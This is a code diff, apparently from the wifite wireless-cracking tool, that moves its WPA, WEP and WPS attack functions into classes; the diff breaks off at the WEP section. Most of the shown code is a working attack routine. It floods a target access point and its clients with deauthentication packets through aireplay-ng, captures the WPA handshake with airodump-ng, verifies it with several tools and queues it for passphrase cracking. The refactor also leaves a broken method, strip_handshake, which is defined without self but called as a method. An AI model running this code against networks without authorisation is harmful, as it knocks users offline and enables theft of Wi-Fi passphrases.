@@ -287,7 +287,10 @@ class RunConfiguration:
                 self.SHOW_ALREADY_CRACKED = True
                 print GR+' [+]'+W+' including already cracked networks in targets.'
             if options.wpa:
-                print GR+' [+]'+W+' targeting '+G+'WPA'+W+' encrypted networks (use '+G+'-wps'+W+' for WPS scan)'
+                if options.wps:
+                    print GR+' [+]'+W+' targeting '+G+'WPA'+W+' encrypted networks.'
+                else:
+                    print GR+' [+]'+W+' targeting '+G+'WPA'+W+' encrypted networks (use '+G+'-wps'+W+' for WPS scan)'
                 self.WPA_DISABLE = False
             if options.wep:
                 print GR+' [+]'+W+' targeting '+G+'WEP'+W+' encrypted networks'
@@ -661,7 +664,8 @@ def main():
         if t.encryption.find('WPA') != -1:
             need_handshake = True
             if not RUN_CONFIG.WPS_DISABLE and t.wps:
-                need_handshake = not wps_attack(iface, t)
+                wps_attack = WPSAttack()
+                need_handshake = not wps_attack.attack_wps(iface, t)
                 wpa_total += 1
             
             if not need_handshake: wpa_success += 1
@@ -669,12 +673,14 @@ def main():
             
             if not RUN_CONFIG.WPA_DISABLE and need_handshake:
                 wpa_total += 1
-                if wpa_get_handshake(iface, t, ts_clients):
+                wpa_attack = WPAAttack()
+                if wpa_attack.wpa_get_handshake(iface, t, ts_clients):
                     wpa_success += 1
             
         elif t.encryption.find('WEP') != -1:
             wep_total += 1
-            if attack_wep(iface, t, ts_clients):
+            wep_attack = WEPAttack()
+            if wep_attack.attack_wep(iface, t, ts_clients):
                 wep_success += 1
         
         else: print R+' unknown encryption:',t.encryption,W
@@ -1664,6 +1670,7 @@ def analyze_capfile(capfile):
         Prints results to console.
     """
     global RUN_CONFIG
+    wpa_attack = WPAAttack()
     
     if RUN_CONFIG.TARGET_ESSID == '' and RUN_CONFIG.TARGET_BSSID == '':
         print R+' [!]'+O+' target ssid and bssid are required to check for handshakes'
@@ -1688,21 +1695,21 @@ def analyze_capfile(capfile):
     t = Target(RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', RUN_CONFIG.TARGET_ESSID)
     
     if program_exists('pyrit'):
-        result = has_handshake_pyrit(t, capfile)
+        result = wpa_attack.has_handshake_pyrit(t, capfile)
         print GR+' [+]'+W+'    '+G+'pyrit'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
     else: print R+' [!]'+O+' program not found: pyrit'
     if program_exists('cowpatty'):
-        result = has_handshake_cowpatty(t, capfile, nonstrict=True)
+        result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)
         print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (nonstrict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
-        result = has_handshake_cowpatty(t, capfile, nonstrict=False)
+        result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)
         print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (strict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
     else: print R+' [!]'+O+' program not found: cowpatty'
     if program_exists('tshark'):
-        result = has_handshake_tshark(t, capfile)
+        result = wpa_attack.has_handshake_tshark(t, capfile)
         print GR+' [+]'+W+'    '+G+'tshark'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
     else: print R+' [!]'+O+' program not found: tshark'
     if program_exists('aircrack-ng'):
-        result = has_handshake_aircrack(t, capfile)
+        result = wpa_attack.has_handshake_aircrack(t, capfile)
         print GR+' [+]'+W+'    '+G+'aircrack-ng'+W+':\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
     else: print R+' [!]'+O+' program not found: aircrack-ng'
 
@@ -1831,388 +1838,388 @@ def attack_interrupted_prompt():
 #################
 # WPA FUNCTIONS #
 #################
+class WPAAttack:
+    def wpa_get_handshake(self, iface, target, clients):
+        """
+            Opens an airodump capture on the target, dumping to a file.
+            During the capture, sends deauthentication packets to the target both as
+            general deauthentication packets and specific packets aimed at connected clients.
+            Waits until a handshake is captured.
+                "iface"   - interface to capture on
+                "target"  - Target object containing info on access point
+                "clients" - List of Client objects associated with the target
+            Returns True if handshake was found, False otherwise
+        """
+        global RUN_CONFIG
 
-def wpa_get_handshake(iface, target, clients):
-    """
-        Opens an airodump capture on the target, dumping to a file.
-        During the capture, sends deauthentication packets to the target both as
-        general deauthentication packets and specific packets aimed at connected clients.
-        Waits until a handshake is captured.
-            "iface"   - interface to capture on
-            "target"  - Target object containing info on access point
-            "clients" - List of Client objects associated with the target
-        Returns True if handshake was found, False otherwise
-    """
-    global RUN_CONFIG
-
-    if RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1
+        if RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1
     
-    # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
-    save_as = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
+        # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
+        save_as = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
               + '_' + target.bssid.replace(':', '-') + '.cap'
     
-    # Check if we already have a handshake for this SSID... If we do, generate a new filename
-    save_index = 0
-    while os.path.exists(save_as):
-        save_index += 1
-        save_as = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
-                         + '_' + target.bssid.replace(':', '-') \
-                         + '_' + str(save_index) + '.cap'
+        # Check if we already have a handshake for this SSID... If we do, generate a new filename
+        save_index = 0
+        while os.path.exists(save_as):
+            save_index += 1
+            save_as = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
+                             + '_' + target.bssid.replace(':', '-') \
+                             + '_' + str(save_index) + '.cap'
         
-    # Remove previous airodump output files (if needed)
-    remove_airodump_files(RUN_CONFIG.temp + 'wpa')
+        # Remove previous airodump output files (if needed)
+        remove_airodump_files(RUN_CONFIG.temp + 'wpa')
     
-    # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
-    try:
-        # Start airodump-ng process to capture handshakes
-        cmd = ['airodump-ng', 
-              '-w', RUN_CONFIG.temp + 'wpa', 
-              '-c', target.channel, 
-              '--bssid', target.bssid, iface]
-        proc_read = Popen(cmd, stdout=DN, stderr=DN)
+        # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
+        try:
+            # Start airodump-ng process to capture handshakes
+            cmd = ['airodump-ng', 
+                  '-w', RUN_CONFIG.temp + 'wpa', 
+                  '-c', target.channel, 
+                  '--bssid', target.bssid, iface]
+            proc_read = Popen(cmd, stdout=DN, stderr=DN)
         
-        # Setting deauthentication process here to avoid errors later on
-        proc_deauth = None
+            # Setting deauthentication process here to avoid errors later on
+            proc_deauth = None
         
-        print ' %s starting %swpa handshake capture%s on "%s"' % \
-                (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT)+W, G, W, G+target.ssid+W)
-        got_handshake = False
+            print ' %s starting %swpa handshake capture%s on "%s"' % \
+                    (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT)+W, G, W, G+target.ssid+W)
+            got_handshake = False
         
-        seconds_running = 0
+            seconds_running = 0
         
-        target_clients = clients[:]
-        client_index = -1
-        start_time = time.time()
-        # Deauth and check-for-handshake loop
-        while not got_handshake and (RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < RUN_CONFIG.WPA_ATTACK_TIMEOUT):
-            if proc_read.poll() != None:
-                print ""
-                print "airodump-ng exited with status " + str(proc_read.poll())
-                print ""
-                break
-            time.sleep(1)
-            seconds_running = int(time.time() - start_time)
+            target_clients = clients[:]
+            client_index = -1
+            start_time = time.time()
+            # Deauth and check-for-handshake loop
+            while not got_handshake and (RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < RUN_CONFIG.WPA_ATTACK_TIMEOUT):
+                if proc_read.poll() != None:
+                    print ""
+                    print "airodump-ng exited with status " + str(proc_read.poll())
+                    print ""
+                    break
+                time.sleep(1)
+                seconds_running = int(time.time() - start_time)
             
-            print "                                                          \r",
-            print ' %s listening for handshake...\r' % \
-                  (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W),
-            stdout.flush()
-            
-            if seconds_running % RUN_CONFIG.WPA_DEAUTH_TIMEOUT == 0: 
-                # Send deauth packets via aireplay-ng
-                cmd = ['aireplay-ng', 
-                      '--ignore-negative-one',
-                      '-0',  # Attack method (Deauthentication)
-                       str(RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
-                      '-a', target.bssid]
-                
-                client_index += 1
-                
-                if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
-                    print " %s sending %s deauth to %s*broadcast*%s..." % \
-                             (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, G, W),
-                    client_index = -1
-                else:
-                    print " %s sending %s deauth to %s... " % \
-                             (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, \
-                              G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, \
-                             G+target_clients[client_index].bssid+W),
-                    cmd.append('-h')
-                    cmd.append(target_clients[client_index].bssid)
-                cmd.append(iface)
-                stdout.flush()
-                
-                # Send deauth packets via aireplay, wait for them to complete.
-                proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
-                proc_deauth.wait()
-                print "sent\r",
+                print "                                                          \r",
+                print ' %s listening for handshake...\r' % \
+                      (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W),
                 stdout.flush()
             
-            # Copy current dump file for consistency
-            if not os.path.exists(RUN_CONFIG.temp + 'wpa-01.cap'): continue
-            copy(RUN_CONFIG.temp + 'wpa-01.cap', RUN_CONFIG.temp + 'wpa-01.cap.temp')
-            
-            # Save copy of cap file (for debugging)
-            #remove_file('/root/new/wpa-01.cap')
-            #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
-            
-            # Check for handshake
-            if has_handshake(target, RUN_CONFIG.temp + 'wpa-01.cap.temp'):
-                got_handshake = True
+                if seconds_running % RUN_CONFIG.WPA_DEAUTH_TIMEOUT == 0: 
+                    # Send deauth packets via aireplay-ng
+                    cmd = ['aireplay-ng', 
+                          '--ignore-negative-one',
+                          '-0',  # Attack method (Deauthentication)
+                           str(RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
+                          '-a', target.bssid]
                 
-                try: os.mkdir(RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)
-                except OSError: pass
+                    client_index += 1
                 
-                # Kill the airodump and aireplay processes
+                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
+                        print " %s sending %s deauth to %s*broadcast*%s..." % \
+                                 (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, G, W),
+                        client_index = -1
+                    else:
+                        print " %s sending %s deauth to %s... " % \
+                                 (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, \
+                                  G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, \
+                                 G+target_clients[client_index].bssid+W),
+                        cmd.append('-h')
+                        cmd.append(target_clients[client_index].bssid)
+                    cmd.append(iface)
+                    stdout.flush()
+                
+                    # Send deauth packets via aireplay, wait for them to complete.
+                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
+                    proc_deauth.wait()
+                    print "sent\r",
+                    stdout.flush()
+            
+                # Copy current dump file for consistency
+                if not os.path.exists(RUN_CONFIG.temp + 'wpa-01.cap'): continue
+                copy(RUN_CONFIG.temp + 'wpa-01.cap', RUN_CONFIG.temp + 'wpa-01.cap.temp')
+            
+                # Save copy of cap file (for debugging)
+                #remove_file('/root/new/wpa-01.cap')
+                #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
+            
+                # Check for handshake
+                if self.has_handshake(target, RUN_CONFIG.temp + 'wpa-01.cap.temp'):
+                    got_handshake = True
+                
+                    try: os.mkdir(RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)
+                    except OSError: pass
+                
+                    # Kill the airodump and aireplay processes
+                    send_interrupt(proc_read)
+                    send_interrupt(proc_deauth)
+                
+                    # Save a copy of the handshake
+                    rename(RUN_CONFIG.temp + 'wpa-01.cap.temp', save_as)
+                
+                    print '\n %s %shandshake captured%s! saved as "%s"' % (GR+sec_to_hms(seconds_running)+W, G, W, G+save_as+W)
+                    RUN_CONFIG.WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
+                    RUN_CONFIG.WPA_FINDINGS.append('saved as %s' % (save_as))
+                    RUN_CONFIG.WPA_FINDINGS.append('')
+                
+                    # Strip handshake if needed
+                    if RUN_CONFIG.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)
+                
+                    # Add the filename and SSID to the list of 'to-crack'
+                    # Cracking will be handled after all attacks are finished.
+                    RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
+                
+                    break # Break out of while loop
+                
+                # No handshake yet
+                os.remove(RUN_CONFIG.temp + 'wpa-01.cap.temp')
+            
+                # Check the airodump output file for new clients
+                for client in parse_csv(RUN_CONFIG.temp + 'wpa-01.csv')[1]:
+                    if client.station != target.bssid: continue
+                    new_client = True
+                    for c in target_clients:
+                        if client.bssid == c.bssid: 
+                            new_client = False
+                            break
+                
+                    if new_client:
+                        print " %s %snew client%s found: %s                         " % \
+                               (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
+                               G+client.bssid+W)
+                        target_clients.append(client)
+            
+            # End of Handshake wait loop.
+            
+            if not got_handshake:
+                print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
+    
+        except KeyboardInterrupt: 
+            print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
+            if attack_interrupted_prompt():
+                remove_airodump_files(RUN_CONFIG.temp + 'wpa')
                 send_interrupt(proc_read)
                 send_interrupt(proc_deauth)
-                
-                # Save a copy of the handshake
-                rename(RUN_CONFIG.temp + 'wpa-01.cap.temp', save_as)
-                
-                print '\n %s %shandshake captured%s! saved as "%s"' % (GR+sec_to_hms(seconds_running)+W, G, W, G+save_as+W)
-                RUN_CONFIG.WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
-                RUN_CONFIG.WPA_FINDINGS.append('saved as %s' % (save_as))
-                RUN_CONFIG.WPA_FINDINGS.append('')
-                
-                # Strip handshake if needed
-                if RUN_CONFIG.WPA_STRIP_HANDSHAKE: strip_handshake(save_as)
-                
-                # Add the filename and SSID to the list of 'to-crack'
-                # Cracking will be handled after all attacks are finished.
-                RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
-                
-                break # Break out of while loop
-                
-            # No handshake yet
-            os.remove(RUN_CONFIG.temp + 'wpa-01.cap.temp')
+                print ''
+                exit_gracefully(0)
             
-            # Check the airodump output file for new clients
-            for client in parse_csv(RUN_CONFIG.temp + 'wpa-01.csv')[1]:
-                if client.station != target.bssid: continue
-                new_client = True
-                for c in target_clients:
-                    if client.bssid == c.bssid: 
-                        new_client = False
-                        break
-                
-                if new_client:
-                    print " %s %snew client%s found: %s                         " % \
-                           (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
-                           G+client.bssid+W)
-                    target_clients.append(client)
-            
-        # End of Handshake wait loop.
-        
-        if not got_handshake:
-            print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
+
+        # clean up
+        remove_airodump_files(RUN_CONFIG.temp + 'wpa')
+        send_interrupt(proc_read)
+        send_interrupt(proc_deauth)
     
-    except KeyboardInterrupt: 
-        print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
-        if attack_interrupted_prompt():
-            remove_airodump_files(RUN_CONFIG.temp + 'wpa')
-            send_interrupt(proc_read)
-            send_interrupt(proc_deauth)
-            print ''
-            exit_gracefully(0)
-            
+        return got_handshake
 
-    # clean up
-    remove_airodump_files(RUN_CONFIG.temp + 'wpa')
-    send_interrupt(proc_read)
-    send_interrupt(proc_deauth)
-    
-    return got_handshake
-
-def has_handshake_tshark(target, capfile):
-    """
-        Uses TShark to check for a handshake.
-        Returns "True" if handshake is found, false otherwise.
-    """
-    if program_exists('tshark'):
-        # Call Tshark to return list of EAPOL packets in cap file.
-        cmd = ['tshark',
-               '-r', capfile, # Input file
-               '-R', 'eapol', # Filter (only EAPOL packets)
-               '-n']          # Do not resolve names (MAC vendors)
-        proc = Popen(cmd, stdout=PIPE, stderr=DN)
-        proc.wait()
-        lines = proc.communicate()[0].split('\n')
+    def has_handshake_tshark(self, target, capfile):
+        """
+            Uses TShark to check for a handshake.
+            Returns "True" if handshake is found, false otherwise.
+        """
+        if program_exists('tshark'):
+            # Call Tshark to return list of EAPOL packets in cap file.
+            cmd = ['tshark',
+                   '-r', capfile, # Input file
+                   '-R', 'eapol', # Filter (only EAPOL packets)
+                   '-n']          # Do not resolve names (MAC vendors)
+            proc = Popen(cmd, stdout=PIPE, stderr=DN)
+            proc.wait()
+            lines = proc.communicate()[0].split('\n')
         
-        # Get list of all clients in cap file
-        clients = []
-        for line in lines:
-            if line.find('appears to have been cut short') != -1 or line.find('Running as user "root"') != -1 or line.strip() == '':
-                continue
-            
-            while line.startswith(' '):  line = line[1:]
-            while line.find('  ') != -1: line = line.replace('  ', ' ')
-            
-            fields = line.split(' ')
-		
-            # ensure tshark dumped correct info
-            if len(fields) < 5:
-                continue
-
-            src = fields[2].lower()
-            dst = fields[4].lower()
-            
-            if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
-            elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)
-        
-        # Check each client for a handshake
-        for client in clients:
-            msg_num = 1 # Index of message in 4-way handshake (starts at 1)
-            
+            # Get list of all clients in cap file
+            clients = []
             for line in lines:
-                if line.find('appears to have been cut short') != -1: continue
-                if line.find('Running as user "root"') != -1: continue
-                if line.strip() == '': continue
-                
-                # Sanitize tshark's output, separate into fields
-                while line[0] == ' ': line = line[1:]
+                if line.find('appears to have been cut short') != -1 or line.find('Running as user "root"') != -1 or line.strip() == '':
+                    continue
+            
+                while line.startswith(' '):  line = line[1:]
                 while line.find('  ') != -1: line = line.replace('  ', ' ')
                 
                 fields = line.split(' ')
-                
-                # Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
-                # This catches this glitch and fixes it.
-                if len(fields) < 8: 
+		
+                # ensure tshark dumped correct info
+                if len(fields) < 5:
                     continue
-                elif len(fields) == 8:
-                    fields.append('(msg')
-                    fields.append('3/4)')
+
+                src = fields[2].lower()
+                dst = fields[4].lower()
+            
+                if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
+                elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)
+        
+            # Check each client for a handshake
+            for client in clients:
+                msg_num = 1 # Index of message in 4-way handshake (starts at 1)
+            
+                for line in lines:
+                    if line.find('appears to have been cut short') != -1: continue
+                    if line.find('Running as user "root"') != -1: continue
+                    if line.strip() == '': continue
                 
-                src = fields[2].lower() # Source MAC address
-                dst = fields[4].lower() # Destination MAC address
-                #msg = fields[9][0]      # The message number (1, 2, 3, or 4)
-                msg = fields[-1][0]
+                    # Sanitize tshark's output, separate into fields
+                    while line[0] == ' ': line = line[1:]
+                    while line.find('  ') != -1: line = line.replace('  ', ' ')
                 
-                # First, third msgs in 4-way handshake are from the target to client
-                if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
-                # Second, fourth msgs in 4-way handshake are from client to target
-                elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue
+                    fields = line.split(' ')
                 
-                # The messages must appear in sequential order.
-                try:
-                    if int(msg) != msg_num: continue
-                except ValueError: continue
+                    # Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
+                    # This catches this glitch and fixes it.
+                    if len(fields) < 8: 
+                        continue
+                    elif len(fields) == 8:
+                        fields.append('(msg')
+                        fields.append('3/4)')
                 
-                msg_num += 1
+                    src = fields[2].lower() # Source MAC address
+                    dst = fields[4].lower() # Destination MAC address
+                    #msg = fields[9][0]      # The message number (1, 2, 3, or 4)
+                    msg = fields[-1][0]
                 
-                # We need the first 4 messages of the 4-way handshake
-                # Although aircrack-ng cracks just fine with only 3 of the messages...
-                if msg_num >= 4:
+                    # First, third msgs in 4-way handshake are from the target to client
+                    if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
+                    # Second, fourth msgs in 4-way handshake are from client to target
+                    elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue
+                
+                    # The messages must appear in sequential order.
+                    try:
+                        if int(msg) != msg_num: continue
+                    except ValueError: continue
+                
+                    msg_num += 1
+                
+                    # We need the first 4 messages of the 4-way handshake
+                    # Although aircrack-ng cracks just fine with only 3 of the messages...
+                    if msg_num >= 4:
+                        return True
+        return False
+
+    def has_handshake_cowpatty(self, target, capfile, nonstrict=True):
+        """
+            Uses cowpatty to check for a handshake.
+            Returns "True" if handshake is found, false otherwise.
+        """
+        if not program_exists('cowpatty'): return False
+        
+        # Call cowpatty to check if capfile contains a valid handshake.
+        cmd = ['cowpatty',
+               '-r', capfile,     # input file
+               '-s', target.ssid, # SSID
+               '-c']              # Check for handshake
+        # Uses frames 1, 2, or 3 for key attack
+        if nonstrict: cmd.append('-2')
+        proc = Popen(cmd, stdout=PIPE, stderr=DN)
+        proc.wait()
+        response = proc.communicate()[0]
+        if response.find('incomplete four-way handshake exchange') != -1:
+            return False
+        elif response.find('Unsupported or unrecognized pcap file.') != -1:
+            return False
+        elif response.find('Unable to open capture file: Success') != -1:
+            return False
+        return True
+
+    def has_handshake_pyrit(self, target, capfile):
+        """
+            Uses pyrit to check for a handshake.
+            Returns "True" if handshake is found, false otherwise.
+        """
+        if not program_exists('pyrit'): return False
+    
+        # Call pyrit to "Analyze" the cap file's handshakes.
+        cmd = ['pyrit',
+               '-r', capfile,
+               'analyze']
+        proc = Popen(cmd, stdout=PIPE, stderr=DN)
+        proc.wait()
+        hit_essid = False
+        for line in proc.communicate()[0].split('\n'):
+            # Iterate over every line of output by Pyrit
+            if line == '' or line == None: continue
+            if line.find("AccessPoint") != -1:
+                hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
+                            (line.lower().find(target.bssid.lower()) != -1)
+                #hit_essid = (line.lower().find(target.bssid.lower()))
+        
+            else:
+                # If Pyrit says it's good or workable, it's a valid handshake.
+                if hit_essid and (line.find(', good, ') != -1 or \
+                                  line.find(', workable, ') != -1):
                     return True
-    return False
+        return False
 
-def has_handshake_cowpatty(target, capfile, nonstrict=True):
-    """
-        Uses cowpatty to check for a handshake.
-        Returns "True" if handshake is found, false otherwise.
-    """
-    if not program_exists('cowpatty'): return False
+    def has_handshake_aircrack(self, target, capfile):
+        """
+            Uses aircrack-ng to check for handshake.
+            Returns True if found, False otherwise.
+        """
+        if not program_exists('aircrack-ng'): return False
+        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
+        proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
+        proc_crack.wait()
+        txt = proc_crack.communicate()[0]
     
-    # Call cowpatty to check if capfile contains a valid handshake.
-    cmd = ['cowpatty',
-           '-r', capfile,     # input file
-           '-s', target.ssid, # SSID
-           '-c']              # Check for handshake
-    # Uses frames 1, 2, or 3 for key attack
-    if nonstrict: cmd.append('-2')
-    proc = Popen(cmd, stdout=PIPE, stderr=DN)
-    proc.wait()
-    response = proc.communicate()[0]
-    if response.find('incomplete four-way handshake exchange') != -1:
-        return False
-    elif response.find('Unsupported or unrecognized pcap file.') != -1:
-        return False
-    elif response.find('Unable to open capture file: Success') != -1:
-        return False
-    return True
+        return (txt.find('Passphrase not in dictionary') != -1)
 
-def has_handshake_pyrit(target, capfile):
-    """
-        Uses pyrit to check for a handshake.
-        Returns "True" if handshake is found, false otherwise.
-    """
-    if not program_exists('pyrit'): return False
+    def has_handshake(self, target, capfile):
+        """
+            Checks if .cap file contains a handshake.
+            Returns True if handshake is found, False otherwise.
+        """
+        global RUN_CONFIG
+        valid_handshake = True
+        tried = False
+        if RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
+            tried = True
+            valid_handshake = self.has_handshake_tshark(target, capfile)
     
-    # Call pyrit to "Analyze" the cap file's handshakes.
-    cmd = ['pyrit',
-           '-r', capfile,
-           'analyze']
-    proc = Popen(cmd, stdout=PIPE, stderr=DN)
-    proc.wait()
-    hit_essid = False
-    for line in proc.communicate()[0].split('\n'):
-        # Iterate over every line of output by Pyrit
-        if line == '' or line == None: continue
-        if line.find("AccessPoint") != -1:
-            hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
-                        (line.lower().find(target.bssid.lower()) != -1)
-            #hit_essid = (line.lower().find(target.bssid.lower()))
+        if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
+            tried = True
+            valid_handshake = self.has_handshake_cowpatty(target, capfile)
+    
+        # Use CowPatty to check for handshake.
+        if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
+            tried = True
+            valid_handshake = self.has_handshake_cowpatty(target, capfile)
+        
+        # Check for handshake using Pyrit if applicable
+        if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_PYRIT:
+            tried = True
+            valid_handshake = self.has_handshake_pyrit(target, capfile)
+    
+        # Check for handshake using aircrack-ng
+        if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
+            tried = True
+            valid_handshake = self.has_handshake_aircrack(target, capfile)
+    
+        if tried: return valid_handshake
+        print R+' [!]'+O+' unable to check for handshake: all handshake options are disabled!'
+        exit_gracefully(1)
+
+    def strip_handshake(capfile):
+        """
+            Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
+            File in location 'capfile' is overwritten!
+        """
+        output_file = capfile
+        if program_exists('pyrit'):
+            cmd = ['pyrit',
+                 '-r', capfile,
+                 '-o', output_file,
+                 'strip']
+            call(cmd,stdout=DN, stderr=DN)
+        
+        elif program_exists('tshark'):
+            # strip results with tshark
+            cmd = ['tshark',
+                   '-r', capfile,      # input file
+                   '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
+                   '-w', capfile + '.temp'] # output file
+            proc_strip = call(cmd, stdout=DN, stderr=DN)
+        
+            rename(capfile + '.temp', output_file)
         
         else:
-            # If Pyrit says it's good or workable, it's a valid handshake.
-            if hit_essid and (line.find(', good, ') != -1 or \
-                              line.find(', workable, ') != -1):
-                return True
-    return False
-
-def has_handshake_aircrack(target, capfile):
-    """
-        Uses aircrack-ng to check for handshake.
-        Returns True if found, False otherwise.
-    """
-    if not program_exists('aircrack-ng'): return False
-    crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
-    proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
-    proc_crack.wait()
-    txt = proc_crack.communicate()[0]
-    
-    return (txt.find('Passphrase not in dictionary') != -1)
-
-def has_handshake(target, capfile):
-    """
-        Checks if .cap file contains a handshake.
-        Returns True if handshake is found, False otherwise.
-    """
-    global RUN_CONFIG
-    valid_handshake = True
-    tried = False
-    if RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
-        tried = True
-        valid_handshake = has_handshake_tshark(target, capfile)
-    
-    if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
-        tried = True
-        valid_handshake = has_handshake_cowpatty(target, capfile)
-    
-    # Use CowPatty to check for handshake.
-    if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
-        tried = True
-        valid_handshake = has_handshake_cowpatty(target, capfile)
-        
-    # Check for handshake using Pyrit if applicable
-    if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_PYRIT:
-        tried = True
-        valid_handshake = has_handshake_pyrit(target, capfile)
-    
-    # Check for handshake using aircrack-ng
-    if valid_handshake and RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
-        tried = True
-        valid_handshake = has_handshake_aircrack(target, capfile)
-    
-    if tried: return valid_handshake
-    print R+' [!]'+O+' unable to check for handshake: all handshake options are disabled!'
-    exit_gracefully(1)
-
-def strip_handshake(capfile):
-    """
-        Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
-        File in location 'capfile' is overwritten!
-    """
-    output_file = capfile
-    if program_exists('pyrit'):
-        cmd = ['pyrit',
-             '-r', capfile,
-             '-o', output_file,
-             'strip']
-        call(cmd,stdout=DN, stderr=DN)
-        
-    elif program_exists('tshark'):
-        # strip results with tshark
-        cmd = ['tshark',
-               '-r', capfile,      # input file
-               '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
-               '-w', capfile + '.temp'] # output file
-        proc_strip = call(cmd, stdout=DN, stderr=DN)
-        
-        rename(capfile + '.temp', output_file)
-        
-    else:
-        print R+" [!]"+O+" unable to strip .cap file: neither pyrit nor tshark were found"+W
+            print R+" [!]"+O+" unable to strip .cap file: neither pyrit nor tshark were found"+W
 
 ##########################
 # WPA CRACKING FUNCTIONS #
@@ -2319,668 +2326,668 @@ def add_commas(n):
 #################
 # WEP FUNCTIONS #
 #################
-
-def attack_wep(iface, target, clients):
